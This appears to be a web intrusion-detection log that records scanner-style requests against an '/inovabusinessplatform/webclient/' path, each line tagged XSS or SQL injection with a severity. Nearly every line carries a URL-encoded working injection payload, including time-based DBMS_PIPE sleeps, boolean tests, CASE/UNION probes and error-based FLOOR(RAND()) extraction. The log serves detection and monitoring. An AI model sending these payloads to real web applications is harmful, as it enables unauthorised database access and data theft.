XSS_INJECTION->LOW | 2019-08-27 09:52:22 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27ITTbgM%3C%27%22%3EoMnMZv
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%204696%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2899%29%7C%7CCHR%2874%29%7C%7CCHR%2875%29%7C%7CCHR%2899%29%2C5%29
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%204696%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2899%29%7C%7CCHR%2874%29%7C%7CCHR%2875%29%7C%7CCHR%2899%29%2C5%29%20AND%20%28%27oGAM%27%3D%27oGAM
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%204696%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2899%29%7C%7CCHR%2874%29%7C%7CCHR%2875%29%7C%7CCHR%2899%29%2C5%29%20AND%20%27QGKo%27%3D%27QGKo
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%204696%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2899%29%7C%7CCHR%2874%29%7C%7CCHR%2875%29%7C%7CCHR%2899%29%2C5%29%20XJAe
XSS_INJECTION->LOW | 2019-08-27 09:52:22 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27ITTbgM%3C%27%22%3EoMnMZv
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:22 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%207101%3D9190%20AND%20%285231%3D5231
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:22 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%207143%3D7143%20AND%20%282335%3D2335
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%204849%3D2052
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%207143%3D7143
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%205901%3D5424%20AND%20%28%27FOtm%27%3D%27FOtm
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%207143%3D7143%20AND%20%28%27bezG%27%3D%27bezG
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%204676%3D8629%20AND%20%27aolz%27%3D%27aolz
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%207143%3D7143%20AND%20%27ExZz%27%3D%27ExZz
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%203246%3D1698%20iiAT
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%207143%3D7143%20UFue
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%28SELECT%20%28CASE%20WHEN%20%286537%3D6311%29%20THEN%20%27%27%20ELSE%20%28SELECT%206311%20UNION%20SELECT%201316%29%20END%29%29
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%28SELECT%20%28CASE%20WHEN%20%285122%3D5122%29%20THEN%20%27%27%20ELSE%20%28SELECT%202512%20UNION%20SELECT%208604%29%20END%29%29
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%20%28SELECT%202389%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178787171%2C%28SELECT%20%28ELT%282389%3D2389%2C1%29%29%29%2C0x716b6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%288501%3D8501
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%20%28SELECT%202389%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178787171%2C%28SELECT%20%28ELT%282389%3D2389%2C1%29%29%29%2C0x716b6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%20%28SELECT%202389%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178787171%2C%28SELECT%20%28ELT%282389%3D2389%2C1%29%29%29%2C0x716b6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%27uqNE%27%3D%27uqNE
